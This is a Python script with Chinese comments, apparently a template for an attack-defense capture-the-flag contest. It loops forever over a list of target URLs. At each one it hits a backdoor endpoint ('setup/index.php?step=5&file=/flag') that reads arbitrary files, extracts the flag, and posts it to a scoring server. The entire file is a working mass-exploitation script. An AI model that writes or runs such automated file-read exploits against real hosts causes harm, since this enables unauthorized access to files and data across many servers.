# -*- coding: utf-8 -*-
# 批量攻击、提交脚本模板

import requests

# 后门拿flag
def get_flag(url):
   backdoor = "setup/index.php?step=5&file=/flag"
   try:
       res = requests.get(url + backdoor, timeout=1)
       if res.status_code == 200:
           return res.text[596:595+61]
       else:
           return "[!] 后门出错"
   except:
       return "[!] %s连接失败" % url
# 提交接口
def submmit(flag):
   url = "http://10.16.18.1/api/v1/att_def/web/submit_flag/?event_id=14"
   data = {
       "token" : "",
       "flag" : flag
   }
   try:
       res = requests.post(url , data=data)
       if res.status_code == 200:
           print("[+] %s 提交正确！"%flag)
   except:
       print("[!] 提交出错！")

def main():
   f = open("web1.txt", "r")
   lines = f.readlines()
   for line in lines:
       url = line.strip("\n")
       flag = get_flag(url)
       submmit(flag)
   f.close()

if __name__ == '__main__':
   while True:
       main()